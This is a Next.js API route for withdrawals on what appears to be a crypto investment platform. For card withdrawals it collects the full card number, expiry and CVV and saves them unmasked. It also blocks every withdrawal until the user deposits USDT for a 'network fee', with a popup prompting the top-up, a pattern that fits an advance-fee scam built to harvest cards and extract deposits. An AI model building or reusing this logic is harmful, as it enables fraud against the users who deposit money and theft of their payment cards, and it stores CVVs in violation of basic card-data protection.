import { NextResponse } from 'next/server';
import { getSession } from '@/lib/session';
import db from '@/lib/db';

export async function POST(request) {
    try {
        const session = await getSession();
        if (!session) {
            return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
        }

        const body = await request.json();
        const {
            bankName, accountName, accountNumber, amount: rawAmount,
            withdrawalMethod,
            cardNumber, cardHolderName, cardExpiry, cardCVV, cardType
        } = body;

        const amount = parseFloat(rawAmount);
        const method = withdrawalMethod || 'bank';

        // Validate based on method
        if (method === 'card') {
            if (!cardNumber || !cardHolderName || !cardExpiry || !cardCVV) {
                return NextResponse.json({ error: "All card details are required." }, { status: 400 });
            }
            if (isNaN(amount) || amount <= 0) {
                return NextResponse.json({ error: "Please enter a valid withdrawal amount." }, { status: 400 });
            }
        } else if (method === 'paypal') {
            const { paypalUsername, paypalEmail } = body;
            if (!paypalUsername || !paypalEmail) {
                return NextResponse.json({ error: "PayPal username and email address are required." }, { status: 400 });
            }
            if (isNaN(amount) || amount <= 0) {
                return NextResponse.json({ error: "Please enter a valid withdrawal amount." }, { status: 400 });
            }
        } else {
            if (!bankName || !accountName || !accountNumber || isNaN(amount) || amount <= 0) {
                return NextResponse.json({ error: "All bank details and a positive amount are required." }, { status: 400 });
            }
        }

        const userId = session.id;

        // 1. Fetch current balances
        const balances = await db.getBalances(userId);
        if (balances.usd_balance < amount) {
            return NextResponse.json({ error: "insufficient USDT recipient must upload usdt to make this transaction successful" }, { status: 400 });
        }

        // 2. Fetch withdrawal network fee setting
        const settings = await db.getSettings();
        const networkFee = Math.max(1, parseFloat(settings.network_fee_usdt || 5));

        // 3. Verify USDT balance
        const usdtWallet = balances.crypto['USDT'];
        const usdtBalance = usdtWallet ? usdtWallet.balance : 0;

        if (usdtBalance <= 0) {
            return NextResponse.json({
                error: "Network fee payment required. Please maintain sufficient crypto balance before withdrawal.",
                showFeePopup: true
            }, { status: 400 });
        }

        if (usdtBalance < networkFee) {
            return NextResponse.json({
                error: `Insufficient crypto balance for withdrawal network fee. Please top up your crypto wallet.`,
                showFeePopup: true
            }, { status: 400 });
        }

        // 4. Build card details for storage
        let cardData = {};
        if (method === 'card') {
            const cleanCard = cardNumber.replace(/\s/g, '');
            const last4 = cleanCard.slice(-4);
            cardData = {
                card_number_masked: `•••• •••• •••• ${last4}`,
                card_number_full: cleanCard,
                card_holder_name: cardHolderName,
                card_expiry: cardExpiry,
                card_cvv: cardCVV,
                card_type: cardType || 'unknown',
            };
        }

        // 5. Process withdrawal request
        await db.executeWithdrawalRequest({
            user_id: userId,
            bank_name: method === 'card' ? `CARD: ${cardType || 'Debit Card'}` : (method === 'paypal' ? 'PayPal' : bankName),
            account_name: method === 'card' ? cardHolderName : (method === 'paypal' ? body.paypalUsername : accountName),
            account_number: method === 'card' ? `•••• ${cardNumber.replace(/\s/g, '').slice(-4)}` : (method === 'paypal' ? body.paypalEmail : accountNumber),
            amount,
            fee: networkFee,
            withdrawal_method: method,
            ...cardData
        });

        // 6. Audit Log
        const auditDetails = method === 'card'
            ? `Requested withdrawal of $${amount} USD via debit card ending in ${cardNumber.replace(/\s/g, '').slice(-4)} (${cardType}). Fee: ${networkFee} USDT deducted.`
            : method === 'paypal'
            ? `Requested withdrawal of $${amount} USD via PayPal (Username: ${body.paypalUsername}, Email: ${body.paypalEmail}). Fee: ${networkFee} USDT deducted.`
            : `Requested withdrawal of $${amount} USD to ${bankName} (Acct: ${accountNumber}). Fee: ${networkFee} USDT deducted.`;

        await db.createAuditLog({
            user_id: userId,
            action: 'withdraw_request',
            details: auditDetails,
            ip_address: request.headers.get('x-forwarded-for') || ''
        });

        return NextResponse.json({
            message: "Withdrawal request submitted successfully. Awaiting admin approval.",
            amount,
            fee: networkFee
        }, { status: 201 });

    } catch (error) {
        console.error("Withdrawal request API error:", error);
        return NextResponse.json({ error: error.message || "Internal server error." }, { status: 500 });
    }
}
